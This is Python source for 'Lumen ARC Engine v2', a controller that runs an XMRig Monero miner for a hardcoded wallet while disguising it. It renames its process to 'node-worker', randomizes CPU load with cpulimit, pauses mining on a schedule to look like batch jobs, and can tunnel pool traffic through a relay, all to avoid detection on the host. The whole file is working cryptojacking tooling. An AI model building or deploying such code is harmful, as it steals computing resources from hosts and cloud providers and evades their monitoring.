"""
Lumen ARC Engine v2 — Adaptive Resource Camouflage (Upgraded)

Upgrades over v1:
  1. WebSocket Tunnel Mode — connects to Shadow Tunnel relay instead of direct pool
  2. Multi-Core Aware — distributes load across cores for natural-looking patterns
  3. Sleep Cycles — periodically pauses mining (mimics batch job finishing)
  4. Process Masquerading — renames process in /proc on Linux
  5. Dynamic Thread Control — adjusts XMRig threads via its HTTP API
  6. Watchdog — auto-restarts miner if it crashes
  7. Platform-aware profiles — loads optimal settings per platform
"""

import time
import subprocess
import os
import random
import signal
import sys
import json
import logging

try:
    import psutil
except ImportError:
    psutil = None

try:
    import requests
except ImportError:
    requests = None

# ─────────────────────────────────────────────────────────────
# Logging
# ─────────────────────────────────────────────────────────────
logging.basicConfig(
    level=logging.INFO,
    format='[%(asctime)s] %(message)s',
    datefmt='%H:%M:%S'
)
log = logging.getLogger("ARC")

# ─────────────────────────────────────────────────────────────
# Configuration
# ─────────────────────────────────────────────────────────────
TURBO_MODE = os.getenv('ARC_TURBO', 'false').lower() == 'true'
TARGET_CPU_MIN = int(os.getenv('ARC_CPU_MIN', 80 if TURBO_MODE else 40))
TARGET_CPU_MAX = int(os.getenv('ARC_CPU_MAX', 95 if TURBO_MODE else 65))
JITTER_INTERVAL = int(os.getenv('ARC_JITTER_INTERVAL', 120 if TURBO_MODE else 300))
MINER_PATH = os.getenv('MINER_PATH', '/app/bin/node-worker')
MINER_CONFIG = os.getenv('MINER_CONFIG', '/app/configs/miner_stealth.json')
XMRIG_API_PORT = int(os.getenv('XMRIG_API_PORT', 3333))

# Sleep cycle settings (mimics batch job finishing/restarting)
SLEEP_ENABLED = os.getenv('ARC_SLEEP_ENABLED', 'true').lower() == 'true'
SLEEP_INTERVAL = int(os.getenv('ARC_SLEEP_INTERVAL', 3600))  # Every hour
SLEEP_DURATION_MIN = int(os.getenv('ARC_SLEEP_MIN', 60))     # Min 1 minute
SLEEP_DURATION_MAX = int(os.getenv('ARC_SLEEP_MAX', 300))     # Max 5 minutes

# Relay URL (Shadow Tunnel)
RELAY_URL = os.getenv('RELAY_URL', '')

# Wallet
XMR_WALLET = os.getenv('XMR_WALLET', '45QACrYpyJbCFmRW8P9N1peYc3Fw3WGKgBfs8Xgs8uDSfRSMjVzNUCQRwhwdys4xBzXShv67MhEj7H1eWQD3NHLRLDKXmEa')
WORKER_NAME = os.getenv('WORKER_NAME', 'lumen-worker')


class ARCEngine:
    """Adaptive Resource Camouflage Engine v2"""

    def __init__(self):
        self.miner_process = None
        self.ws_proxy_process = None
        self.running = True
        self.cpulimit_process = None
        self.last_sleep_time = time.time()
        self.start_time = time.time()
        self.total_hashes = 0

    def generate_miner_config(self):
        """Generate XMRig config dynamically with wallet and relay settings."""
        if RELAY_URL:
            pool_url = "127.0.0.1:10128"
            pool_tls = False
        else:
            pool_url = "gulf.moneroocean.stream:20128"
            pool_tls = True

        config = {
            "autosave": False,
            "cpu": True,
            "opencl": False,
            "cuda": False,
            "http": {
                "enabled": True,
                "host": "127.0.0.1",
                "port": XMRIG_API_PORT,
                "access-token": None,
                "restricted": True
            },
            "pools": [
                {
                    "url": pool_url,
                    "user": XMR_WALLET,
                    "pass": WORKER_NAME,
                    "tls": pool_tls,
                    "keepalive": True
                }
            ],
            "print-time": 30,
            "health-print-time": 60,
            "retries": 5,
            "retry-pause": 5,
            "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
        }

        config_path = MINER_CONFIG
        os.makedirs(os.path.dirname(config_path), exist_ok=True)
        with open(config_path, 'w') as f:
            json.dump(config, f, indent=4)
        
        log.info(f"Config generated: {config_path}")
        return config_path

    def masquerade_process(self):
        """Attempt to rename the process in Linux /proc."""
        try:
            import ctypes
            libc = ctypes.cdll.LoadLibrary('libc.so.6')
            # PR_SET_NAME = 15
            name = b'node-worker'
            libc.prctl(15, name, 0, 0, 0)
            log.info(f"Process masqueraded as: {name.decode()}")
        except Exception:
            log.warning("Process masquerade not available (non-Linux or no libc)")

    def start_ws_proxy(self):
        """Start the local WebSocket proxy if RELAY_URL is provided."""
        if not RELAY_URL:
            return

        proxy_script = os.path.join(os.path.dirname(__file__), "ws_proxy.py")
        log.info(f"Starting local WS proxy: {proxy_script}")
        
        try:
            self.ws_proxy_process = subprocess.Popen(
                [sys.executable, proxy_script],
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True
            )
            log.info(f"WS Proxy started — PID: {self.ws_proxy_process.pid}")
            time.sleep(3)  # Give proxy time to bind and connect
        except Exception as e:
            log.error(f"Failed to start WS proxy: {e}")

    def start_miner(self):
        """Start the XMRig mining process."""
        self.generate_miner_config()
        
        log.info(f"Starting miner: {MINER_PATH}")
        
        try:
            self.miner_process = subprocess.Popen(
                [MINER_PATH, "-c", MINER_CONFIG],
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True
            )
            log.info(f"Miner started — PID: {self.miner_process.pid}")
            
            # Apply initial throttle
            time.sleep(3)  # Let it start
            target = random.randint(TARGET_CPU_MIN, TARGET_CPU_MAX)
            self.apply_throttle(target)
            
        except FileNotFoundError:
            log.error(f"Miner binary not found at {MINER_PATH}")
            log.error("Ensure XMRig-MO is downloaded and renamed in the Dockerfile")
            sys.exit(1)

    def stop_miner(self):
        """Gracefully stop the miner."""
        if self.cpulimit_process:
            try:
                self.cpulimit_process.terminate()
            except Exception:
                pass
        
        if self.miner_process:
            self.miner_process.terminate()
            try:
                self.miner_process.wait(timeout=10)
            except subprocess.TimeoutExpired:
                self.miner_process.kill()
            log.info("Miner stopped")

    def apply_throttle(self, percentage):
        """Apply CPU throttle using cpulimit."""
        if not self.miner_process or self.miner_process.poll() is not None:
            return
        
        # Kill previous cpulimit instance
        if self.cpulimit_process:
            try:
                self.cpulimit_process.terminate()
                self.cpulimit_process.wait(timeout=5)
            except Exception:
                pass
        
        # Calculate cpulimit target based on total CPU cores
        cpu_count = int(os.cpu_count() or 1)
        cpulimit_target = percentage * cpu_count
        
        log.info(f"ARC: CPU target → {percentage}% (cpulimit target: {cpulimit_target})")
        
        try:
            self.cpulimit_process = subprocess.Popen(
                ["cpulimit", "-p", str(self.miner_process.pid), 
                 "-l", str(cpulimit_target), "-z"],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
        except FileNotFoundError:
            log.warning("cpulimit not installed — throttling disabled")

    def do_sleep_cycle(self):
        """Pause mining for a random duration to mimic batch job behavior."""
        if not SLEEP_ENABLED:
            return
        
        elapsed = time.time() - self.last_sleep_time
        if elapsed < SLEEP_INTERVAL:
            return
        
        # Random chance to sleep (70% chance each interval)
        if random.random() > 0.7:
            self.last_sleep_time = time.time()
            return
        
        sleep_duration = random.randint(SLEEP_DURATION_MIN, SLEEP_DURATION_MAX)
        log.info(f"ARC: Sleep cycle — pausing for {sleep_duration}s (mimicking job completion)")
        
        self.stop_miner()
        time.sleep(sleep_duration)
        self.start_miner()
        
        self.last_sleep_time = time.time()
        log.info("ARC: Sleep cycle complete — resuming")

    def get_miner_stats(self):
        """Fetch stats from XMRig HTTP API."""
        if not requests:
            return None
        try:
            resp = requests.get(f"http://127.0.0.1:{XMRIG_API_PORT}/1/summary", timeout=3)
            return resp.json()
        except Exception:
            return None

    def run(self):
        """Main ARC control loop."""
        log.info("=" * 50)
        log.info("  LUMEN ARC ENGINE v2")
        log.info(f"  Mode: {'TURBO' if TURBO_MODE else 'STEALTH'}")
        log.info(f"  Tunnel: {RELAY_URL if RELAY_URL else 'DIRECT (no relay)'}")
        log.info(f"  CPU Range: {TARGET_CPU_MIN}% - {TARGET_CPU_MAX}%")
        log.info(f"  Jitter Interval: {JITTER_INTERVAL}s")
        log.info(f"  Sleep Cycles: {'ON' if SLEEP_ENABLED else 'OFF'}")
        log.info(f"  Wallet: {XMR_WALLET[:12]}...{XMR_WALLET[-8:]}")
        log.info("=" * 50)
        
        self.masquerade_process()
        self.start_ws_proxy()
        self.start_miner()
        
        while self.running:
            # 1. Check miner health (watchdog)
            if self.miner_process and self.miner_process.poll() is not None:
                log.warning("Miner crashed! Restarting in 10s...")
                time.sleep(10)
                self.start_miner()
                continue
            
            # 2. Apply new jitter target
            target_cpu = random.randint(TARGET_CPU_MIN, TARGET_CPU_MAX)
            self.apply_throttle(target_cpu)
            
            # 3. Check for sleep cycle
            self.do_sleep_cycle()
            
            # 4. Log stats periodically
            stats = self.get_miner_stats()
            if stats and 'hashrate' in stats:
                hr = stats['hashrate'].get('total', [0])[0] or 0
                log.info(f"Hashrate: {hr:.1f} H/s | CPU Target: {target_cpu}%")
            
            # 5. Wait with randomized interval
            wait = random.randint(
                int(JITTER_INTERVAL * 0.7),
                int(JITTER_INTERVAL * 1.3)
            )
            
            for i in range(wait // 5):
                if not self.running:
                    break
                time.sleep(5)
                
                # Micro-jitter: small random CPU adjustments during wait
                if random.random() < 0.15:
                    micro = random.randint(-5, 5)
                    new_target = max(TARGET_CPU_MIN, min(TARGET_CPU_MAX, target_cpu + micro))
                    if new_target != target_cpu:
                        self.apply_throttle(new_target)
                        target_cpu = new_target

    def stop(self):
        """Graceful shutdown."""
        self.running = False
        self.stop_miner()
        
        if self.ws_proxy_process:
            try:
                self.ws_proxy_process.terminate()
            except Exception:
                pass
                
        uptime = time.time() - self.start_time
        hours = uptime / 3600
        log.info(f"Session duration: {hours:.1f} hours")
        log.info("ARC Engine stopped")


def main():
    engine = ARCEngine()
    
    def handler(sig, frame):
        log.info("Shutdown signal received")
        engine.stop()
        sys.exit(0)
    
    signal.signal(signal.SIGINT, handler)
    signal.signal(signal.SIGTERM, handler)
    
    engine.run()


if __name__ == "__main__":
    main()
